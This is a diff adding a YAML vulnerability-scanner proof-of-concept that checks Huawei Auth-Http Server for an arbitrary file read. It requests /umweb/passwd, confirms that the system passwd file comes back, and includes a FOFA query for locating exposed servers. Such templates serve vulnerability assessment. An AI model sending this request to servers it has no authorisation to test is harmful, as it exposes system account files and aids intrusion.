@@ -1,0 +1,22 @@
+id: poc-yaml-huawei-auth-http-server-anyfile-read
+info:
+  name: 华为Auth-Http服务任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: Auth-Http Server
+  fofa: Auth-Http Server 1.0
+requests:
+- method: GET
+  path: /umweb/passwd
+  expression: 'status_code == 200
+
+    && contains(body,"root:")
+
+    && contains(body,"/bin")
+
+    && !contains(body,"<")
+
+    '
+variables: {}
+transport: http
